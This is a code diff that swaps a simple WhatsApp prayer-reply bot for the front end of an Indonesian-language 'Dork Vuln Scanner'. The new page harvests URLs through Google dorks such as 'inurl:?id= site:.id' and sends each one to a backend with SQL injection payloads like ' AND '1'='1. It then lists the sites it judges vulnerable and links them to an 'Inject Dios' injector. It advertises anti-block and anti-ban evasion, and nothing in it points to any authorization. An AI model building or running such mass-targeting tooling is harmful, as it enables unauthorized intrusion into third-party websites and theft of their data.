@@ -1,120 +1,553 @@
-const { default: makeWASocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
-
-let pairingCode = '';
-let sock;
-let nomorTarget = '';
-
-async function startBot() {
-    const { state, saveCreds } = await useMultiFileAuthState('./auth');
-    sock = makeWASocket({
-        auth: state,
-        printQRInTerminal: false,
-        syncFullHistory: false,
-        browser: ['Bot Doa', 'Chrome', '1.0.0']
-    });
-
-    // Minta kode kalau nomor sudah diisi
-    if (!sock.authState.creds.registered) {
-        sock.ev.on('creds.update', async () => {
-            if (nomorTarget) {
-                setTimeout(async () => {
-                    try {
-                        pairingCode = await sock.requestPairingCode(nomorTarget);
-                    } catch (e) {
-                        pairingCode = 'Nomor salah / belum awali 62';
-                    }
-                }, 2000);
-            }
-        });
-    }
-
-    // Simpan sesi
-    sock.ev.on('creds.update', saveCreds);
-
-    // Status koneksi
-    sock.ev.on('connection.update', (up) => {
-        const { connection } = up;
-        if (connection === 'open') {
-            pairingCode = '✅ BERHASIL TERHUBUNG! Bot siap dipakai.';
-            nomorTarget = ''; // Reset nomor
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JMK48 Dork Vuln Scanner - Cari Web Vuln SQLi 🗿🔥</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: linear-gradient(135deg, #0a0a0a, #0a0a2a, #1a0033);
+            font-family: 'Courier New', monospace;
+            min-height: 100vh;
         }
-        if (connection === 'close') startBot();
-    });
-
-    // === FITUR BOT DOA ===
-    sock.ev.on('messages.upsert', async m => {
-        const pesan = m.messages[0];
-        if (!pesan.key.fromMe && pesan.message) {
-            const teks = pesan.message.conversation || pesan.message.extendedTextMessage?.text;
-            const pengirim = pesan.key.remoteJid;
-
-            if (teks?.toLowerCase() === 'doa pagi') {
-                await sock.sendMessage(pengirim, { text: `Doa Pagi:
-"Ya Allah, dengan rahmat-Mu Engkau bangunkan kami dari tidur, sehatkanlah tubuh kami, terangi hati kami dengan cahaya iman, dan mudahkanlah segala urusan kami sepanjang hari ini. Aamiin."` });
-            }
-            if (teks?.toLowerCase() === 'doa sore') {
-                await sock.sendMessage(pengirim, { text: `Doa Sore:
-"Ya Allah, atas nikmat dan perlindungan-Mu kami memasuki sore hari, lindungilah kami dari kejahatan makhluk-Mu, dan terimalah amal ibadah kami sepanjang hari ini. Aamiin."` });
-            }
-            if (teks?.toLowerCase() === 'doa tidur') {
-                await sock.sendMessage(pengirim, { text: `Doa Tidur:
-"Ya Allah, atas nama-Mu aku hidup dan mati. Jika Engkau mencabut nyawaku, maka ampunilah aku. Dan jika Engkau mengembalikannya, maka lindungilah aku sebagaimana Engkau melindungi hamba-hamba-Mu yang saleh."` });
-            }
+        .navbar {
+            background: #000 !important;
+            border-bottom: 2px solid #ff3366;
+            box-shadow: 0 0 20px rgba(255,51,102,0.3);
         }
-    });
-}
+        .navbar-brand {
+            color: #ff3366 !important;
+            font-weight: bold;
+            text-shadow: 0 0 10px #ff3366;
+        }
+        .hero {
+            background: linear-gradient(135deg, #ff3366, #cc0044);
+            padding: 40px;
+            text-align: center;
+            color: white;
+            position: relative;
+            overflow: hidden;
+        }
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1), transparent);
+            animation: rotate 20s linear infinite;
+        }
+        @keyframes rotate {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+        .hero h1, .hero p { position: relative; z-index: 1; }
+        .card {
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(10px);
+            border: 1px solid #ff3366;
+            border-radius: 20px;
+            margin-bottom: 20px;
+            transition: transform 0.3s;
+        }
+        .card:hover { transform: translateY(-5px); }
+        .card-header {
+            background: linear-gradient(135deg, #ff3366, #cc0044);
+            color: white;
+            font-weight: bold;
+            border-radius: 20px 20px 0 0;
+        }
+        textarea, input {
+            background: #1a1a1a !important;
+            border: 1px solid #ff3366 !important;
+            color: #0f0 !important;
+            font-family: monospace;
+        }
+        textarea:focus, input:focus {
+            box-shadow: 0 0 10px #ff3366 !important;
+            border-color: #ff3366 !important;
+        }
+        .btn-pink {
+            background: linear-gradient(135deg, #ff3366, #cc0044);
+            border: none;
+            color: white;
+            font-weight: bold;
+            padding: 10px 25px;
+            transition: all 0.3s;
+        }
+        .btn-pink:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 20px #ff3366;
+        }
+        .result-box {
+            background: #0a0a0a;
+            border: 1px solid #0f0;
+            border-radius: 10px;
+            padding: 15px;
+            max-height: 500px;
+            overflow-y: auto;
+            font-family: monospace;
+            font-size: 12px;
+        }
+        .vuln-item {
+            background: rgba(255,51,102,0.2);
+            border-left: 4px solid #ff3366;
+            padding: 12px;
+            margin-bottom: 10px;
+            border-radius: 8px;
+            transition: all 0.2s;
+        }
+        .vuln-item:hover {
+            background: rgba(255,51,102,0.4);
+            transform: translateX(5px);
+        }
+        .safe-item {
+            background: rgba(51,51,51,0.5);
+            border-left: 4px solid #666;
+            padding: 8px;
+            margin-bottom: 8px;
+            border-radius: 8px;
+            opacity: 0.7;
+        }
+        .vuln-badge {
+            background: #ff3366;
+            color: white;
+            padding: 3px 10px;
+            border-radius: 20px;
+            font-size: 10px;
+            font-weight: bold;
+        }
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #fff;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 0.6s linear infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .stat-card {
+            background: rgba(0,0,0,0.5);
+            border-radius: 15px;
+            padding: 15px;
+            text-align: center;
+            border: 1px solid #ff3366;
+        }
+        .stat-number {
+            font-size: 28px;
+            font-weight: bold;
+            color: #ff3366;
+        }
+        footer {
+            text-align: center;
+            padding: 20px;
+            color: #888;
+            font-size: 12px;
+        }
+        .progress-bar-custom {
+            height: 4px;
+            background: #ff3366;
+            width: 0%;
+            transition: width 0.3s;
+        }
+        .dork-templates {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-top: 10px;
+        }
+        .dork-tag {
+            background: #333;
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .dork-tag:hover {
+            background: #ff3366;
+            transform: scale(1.05);
+        }
+    </style>
+</head>
+<body>
 
-// Jalankan bot
-startBot();
-
-// HALAMAN WEB INPUT NOMOR + TAMPIL KODE
-module.exports = async (req, res) => {
-    res.setHeader('Content-Type', 'text/html');
-
-    // Ambil nomor dari input
-    if (req.method === 'POST') {
-        const body = [];
-        req.on('data', chunk => body.push(chunk));
-        req.on('end', () => {
-            const data = Buffer.concat(body).toString();
-            nomorTarget = new URLSearchParams(data).get('nomor');
-            pairingCode = 'Sedang diproses...';
-        });
-    }
-
-    res.write(`
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>Bot WA - Ambil Kode Pairing</title>
-        <style>
-            body { font-family: Arial; text-align: center; padding-top: 50px; background: #f0f2f5; }
-            .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); display: inline-block; width: 320px; }
-            h2 { color: #25d366; }
-            input { width: 90%; padding: 10px; margin: 15px 0; border: 1px solid #ccc; border-radius: 6px; font-size: 16px; }
-            button { background: #25d366; color: white; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-size: 16px; width: 100%; }
-            .kode-box { margin-top: 20px; padding: 15px; background: #e8f5e9; border-radius: 8px; }
-            .kode { font-size: 30px; font-weight: bold; color: #1b5e20; letter-spacing: 4px; }
-            .info { font-size: 13px; color: #666; margin-top: 10px; }
-        </style>
-    </head>
-    <body>
-        <div class="card">
-            <h2>🔑 Kode Pairing WhatsApp</h2>
-            <form method="POST">
-                <input type="text" name="nomor" placeholder="Masukkan nomor, contoh: 628123456789" required>
-                <button type="submit">DAPATKAN KODE</button>
-            </form>
-
-            <div class="kode-box">
-                <p>Kode Kamu:</p>
-                <div class="kode">${pairingCode || 'Masukkan nomor dulu'}</div>
-            </div>
-
-            <p class="info">Caranya: Buka WhatsApp > Titik tiga > Perangkat Tertaut > Tautkan Perangkat > Masukkan kode di atas.</p>
+<nav class="navbar navbar-dark sticky-top">
+    <div class="container">
+        <a class="navbar-brand" href="#">
+            <i class="fas fa-search"></i> JMK48 Dork Vuln Scanner
+        </a>
+        <div>
+            <span class="badge bg-danger me-2"><i class="fas fa-shield-alt"></i> Anti-Block</span>
+            <span class="badge bg-warning text-dark"><i class="fas fa-infinity"></i> Anti-Limit</span>
+            <span class="badge bg-success"><i class="fas fa-skull"></i> Vuln Detector</span>
         </div>
-    </body>
-    </html>
-    `);
-    res.end();
-};
+    </div>
+</nav>
+
+<div class="hero">
+    <h1><i class="fas fa-globe"></i> Dork Vuln Scanner</h1>
+    <p>Cari Web Vulnerable dengan Dorking | Auto Test SQLi | Anti Block + Anti Limit 🗿🔥</p>
+</div>
+
+<div class="container mt-4">
+    <!-- Dork Input Section -->
+    <div class="card">
+        <div class="card-header">
+            <i class="fas fa-terminal"></i> Dork Query / Google Dork
+        </div>
+        <div class="card-body">
+            <textarea id="dorkInput" class="form-control" rows="3" placeholder="inurl:?id= site:.id
+inurl:page.php?id=
+inurl:product.php?id=
+inurl:detail.php?id="></textarea>
+            
+            <div class="dork-templates mt-3">
+                <span class="dork-tag" onclick="setDork('inurl:?id= site:.id')">🇮🇩 inurl:?id= site:.id</span>
+                <span class="dork-tag" onclick="setDork('inurl:page.php?id=')">inurl:page.php?id=</span>
+                <span class="dork-tag" onclick="setDork('inurl:product.php?id=')">inurl:product.php?id=</span>
+                <span class="dork-tag" onclick="setDork('inurl:detail.php?id=')">inurl:detail.php?id=</span>
+                <span class="dork-tag" onclick="setDork('inurl:news.php?id=')">inurl:news.php?id=</span>
+                <span class="dork-tag" onclick="setDork('inurl:artikel.php?id=')">inurl:artikel.php?id=</span>
+                <span class="dork-tag" onclick="setDork('inurl:index.php?id=')">inurl:index.php?id=</span>
+                <span class="dork-tag" onclick="setDork('inurl:?page=')">inurl:?page=</span>
+                <span class="dork-tag" onclick="setDork('inurl:?id= intitle:login')">Login Pages</span>
+                <span class="dork-tag" onclick="setDork('inurl:?id= intext:error')">Error Pages</span>
+            </div>
+            
+            <div class="row mt-3">
+                <div class="col-md-4">
+                    <label>Jumlah Hasil:</label>
+                    <input type="number" id="resultCount" class="form-control" value="50" min="10" max="200">
+                </div>
+                <div class="col-md-4">
+                    <label>Delay (ms):</label>
+                    <input type="number" id="delayMs" class="form-control" value="500" min="100" max="5000">
+                </div>
+                <div class="col-md-4">
+                    <label>&nbsp;</label>
+                    <button class="btn btn-pink w-100" onclick="startDorkScan()">
+                        <i class="fas fa-search"></i> Cari Web Vulnerable
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Status & Progress -->
+    <div class="card">
+        <div class="card-header">
+            <i class="fas fa-chart-line"></i> Scan Status
+        </div>
+        <div class="card-body">
+            <div class="progress-bar-custom" id="progressBar"></div>
+            <div id="statusText" class="mt-2 text-muted">Belum mulai scan...</div>
+        </div>
+    </div>
+
+    <!-- Statistics -->
+    <div class="row">
+        <div class="col-md-3">
+            <div class="stat-card">
+                <div class="stat-number" id="totalFound">0</div>
+                <div>Total URL Ditemukan</div>
+            </div>
+        </div>
+        <div class="col-md-3">
+            <div class="stat-card">
+                <div class="stat-number text-warning" id="testingCount">0</div>
+                <div>Sedang Di Test</div>
+            </div>
+        </div>
+        <div class="col-md-3">
+            <div class="stat-card">
+                <div class="stat-number text-success" id="vulnCount">0</div>
+                <div>Vulnerable Ditemukan</div>
+            </div>
+        </div>
+        <div class="col-md-3">
+            <div class="stat-card">
+                <div class="stat-number text-danger" id="safeCount">0</div>
+                <div>Not Vulnerable</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Results - Vulnerable Sites -->
+    <div class="card">
+        <div class="card-header">
+            <i class="fas fa-exclamation-triangle"></i> Web Vulnerable (SQLi) <span id="vulnBadge" class="badge bg-danger ms-2">0</span>
+        </div>
+        <div class="card-body">
+            <div id="vulnResults" class="result-box">
+                <span class="text-muted">Belum ada hasil. Jalankan scan dulu sayang~</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Results - Safe Sites -->
+    <div class="card">
+        <div class="card-header">
+            <i class="fas fa-shield-alt"></i> Not Vulnerable / Aman
+        </div>
+        <div class="card-body">
+            <div id="safeResults" class="result-box" style="max-height: 300px;">
+                <span class="text-muted">Belum ada hasil...</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Full Log -->
+    <div class="card">
+        <div class="card-header">
+            <i class="fas fa-list"></i> Scan Log
+        </div>
+        <div class="card-body">
+            <div id="logResult" class="result-box" style="max-height: 200px;">
+                <span class="text-muted">Log akan muncul disini...</span>
+            </div>
+        </div>
+    </div>
+</div>
+
+<footer>
+    <p>JMK48 Dork Vuln Scanner | Anti Block + Anti Limit | Test SQLi with ' payload | by Gixss 🗿🔥</p>
+</footer>
+
+<script>
+    // ============ JMK48 DORK VULN SCANNER ============
+    let totalUrls = [];
+    let vulnUrls = [];
+    let safeUrls = [];
+    let isScanning = false;
+    
+    function setDork(dork) {
+        document.getElementById('dorkInput').value = dork;
+    }
+    
+    function addLog(msg, type = 'info') {
+        const logDiv = document.getElementById('logResult');
+        const time = new Date().toLocaleTimeString();
+        const colors = { info: '#0f0', warning: '#ff0', error: '#f00', success: '#0f0' };
+        logDiv.innerHTML += `<div style="color: ${colors[type] || '#0f0'}">[${time}] ${msg}</div>`;
+        logDiv.scrollTop = logDiv.scrollHeight;
+        
+        // Update status
+        document.getElementById('statusText').innerHTML = msg;
+    }
+    
+    async function startDorkScan() {
+        if(isScanning) {
+            addLog('Scan sedang berjalan, tunggu selesai!', 'warning');
+            return;
+        }
+        
+        let dorkQuery = document.getElementById('dorkInput').value;
+        if(!dorkQuery.trim()) {
+            addLog('Masukkan dork query dulu sayang~', 'error');
+            return;
+        }
+        
+        // Reset
+        isScanning = true;
+        totalUrls = [];
+        vulnUrls = [];
+        safeUrls = [];
+        
+        document.getElementById('totalFound').innerText = '0';
+        document.getElementById('vulnCount').innerText = '0';
+        document.getElementById('safeCount').innerText = '0';
+        document.getElementById('vulnResults').innerHTML = '<span class="text-muted">Scanning... tunggu bentar sayang~</span>';
+        document.getElementById('safeResults').innerHTML = '<span class="text-muted">Scanning...</span>';
+        document.getElementById('logResult').innerHTML = '';
+        document.getElementById('progressBar').style.width = '0%';
+        
+        addLog(`🚀 Memulai scan dengan dork: ${dorkQuery}`, 'success');
+        
+        // Step 1: Dorking - cari URL dari Google
+        addLog('📡 Mencari URL dari Google Dork... (anti-block aktif)', 'info');
+        
+        const resultCount = document.getElementById('resultCount').value;
+        
+        try {
+            const dorkResponse = await fetch('/api/dork', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    dork: dorkQuery, 
+                    limit: resultCount,
+                    antiBlock: true 
+                })
+            });
+            const dorkData = await dorkResponse.json();
+            
+            if(dorkData.results && dorkData.results.length > 0) {
+                totalUrls = dorkData.results;
+                document.getElementById('totalFound').innerText = totalUrls.length;
+                addLog(`✅ Ditemukan ${totalUrls.length} URL dari dorking`, 'success');
+            } else {
+                addLog('⚠️ Tidak ada URL ditemukan, coba dork lain', 'warning');
+                isScanning = false;
+                return;
+            }
+        } catch(e) {
+            addLog(`❌ Error dorking: ${e.message}`, 'error');
+            isScanning = false;
+            return;
+        }
+        
+        // Step 2: Test setiap URL dengan payload '
+        addLog('🔍 Mulai testing vulnerability dengan payload \' ...', 'info');
+        
+        const delay = parseInt(document.getElementById('delayMs').value);
+        let tested = 0;
+        
+        for(let i = 0; i < totalUrls.length; i++) {
+            let url = totalUrls[i];
+            tested++;
+            document.getElementById('testingCount').innerText = tested;
+            document.getElementById('progressBar').style.width = `${(tested/totalUrls.length)*100}%`;
+            
+            addLog(`🔎 Testing: ${url}`, 'info');
+            
+            try {
+                const testResponse = await fetch('/api/test', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ url: url, payload: "'", antiBlock: true })
+                });
+                const testData = await testResponse.json();
+                
+                if(testData.vulnerable) {
+                    vulnUrls.push({
+                        url: url,
+                        column: testData.column || '?',
+                        error: testData.error_type || 'SQL Error'
+                    });
+                    document.getElementById('vulnCount').innerText = vulnUrls.length;
+                    addLog(`✅ VULNERABLE! ${url}`, 'success');
+                    displayVulnResults();
+                } else {
+                    safeUrls.push(url);
+                    document.getElementById('safeCount').innerText = safeUrls.length;
+                    addLog(`❌ Not vulnerable: ${url}`, 'info');
+                    displaySafeResults();
+                }
+            } catch(e) {
+                addLog(`⚠️ Error testing ${url}: ${e.message}`, 'error');
+            }
+            
+            // Delay anti ban
+            await new Promise(r => setTimeout(r, delay));
+        }
+        
+        addLog(`🎉 Scan selesai! Ditemukan ${vulnUrls.length} web vulnerable dari ${totalUrls.length} total`, 'success');
+        isScanning = false;
+        document.getElementById('testingCount').innerText = '0';
+    }
+    
+    function displayVulnResults() {
+        const container = document.getElementById('vulnResults');
+        if(vulnUrls.length === 0) {
+            container.innerHTML = '<span class="text-muted">Belum ada web vulnerable ditemukan...</span>';
+            return;
+        }
+        
+        let html = '';
+        vulnUrls.forEach((item, idx) => {
+            html += `
+                <div class="vuln-item">
+                    <div class="d-flex justify-content-between align-items-center">
+                        <div>
+                            <span class="vuln-badge">VULNERABLE #${idx+1}</span>
+                            <span class="badge bg-info ms-2">Column: ${item.column}</span>
+                        </div>
+                        <button class="btn btn-sm btn-danger" onclick="copyToClipboard('${item.url}')">
+                            <i class="fas fa-copy"></i> Copy
+                        </button>
+                    </div>
+                    <div class="mt-2">
+                        <a href="${item.url}" target="_blank" class="text-success" style="word-break: break-all;">${item.url}</a>
+                    </div>
+                    <div class="text-warning small mt-1">⚠️ ${item.error}</div>
+                    <div class="mt-2">
+                        <button class="btn btn-sm btn-pink mt-1" onclick="testWithPayload('${item.url}')">
+                            <i class="fas fa-syringe"></i> Test SQLi
+                        </button>
+                        <button class="btn btn-sm btn-info mt-1" onclick="openInjector('${item.url}')">
+                            <i class="fas fa-database"></i> Inject Dios
+                        </button>
+                    </div>
+                </div>
+            `;
+        });
+        container.innerHTML = html;
+        document.getElementById('vulnBadge').innerText = vulnUrls.length;
+    }
+    
+    function displaySafeResults() {
+        const container = document.getElementById('safeResults');
+        if(safeUrls.length === 0) {
+            container.innerHTML = '<span class="text-muted">Belum ada hasil...</span>';
+            return;
+        }
+        
+        let html = '';
+        safeUrls.slice(0, 20).forEach((url, idx) => {
+            html += `
+                <div class="safe-item d-flex justify-content-between align-items-center">
+                    <div style="word-break: break-all; flex:1;">
+                        <span class="text-muted">#${idx+1}</span> ${url}
+                    </div>
+                    <button class="btn btn-sm btn-secondary ms-2" onclick="copyToClipboard('${url}')">
+                        <i class="fas fa-copy"></i>
+                    </button>
+                </div>
+            `;
+        });
+        container.innerHTML = html;
+    }
+    
+    async function testWithPayload(url) {
+        addLog(`🔬 Testing ${url} with payload '`, 'info');
+        try {
+            const response = await fetch('/api/test', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ url: url, payload: "' AND '1'='1", antiBlock: true })
+            });
+            const data = await response.json();
+            if(data.vulnerable) {
+                addLog(`✅ ${url} VULNERABLE!`, 'success');
+                alert(`✅ URL VULNERABLE!\n\nError: ${data.error_type}\n\nBisa di inject!`);
+            } else {
+                addLog(`❌ ${url} Not vulnerable`, 'info');
+                alert(`❌ Not vulnerable`);
+            }
+        } catch(e) {
+            addLog(`Error: ${e.message}`, 'error');
+        }
+    }
+    
+    function openInjector(url) {
+        // Extract base URL and param
+        let injectorUrl = `injector.html?url=${encodeURIComponent(url)}`;
+        window.open(injectorUrl, '_blank');
+    }
+    
+    function copyToClipboard(text) {
+        navigator.clipboard.writeText(text);
+        addLog(`📋 Copied: ${text}`, 'success');
+    }
+    
+    console.log('%c🔥 JMK48 Dork Vuln Scanner Ready | Anti Block | Anti Limit', 'color:#ff3366;font-size:16px');
+</script>
+</body>
+</html>
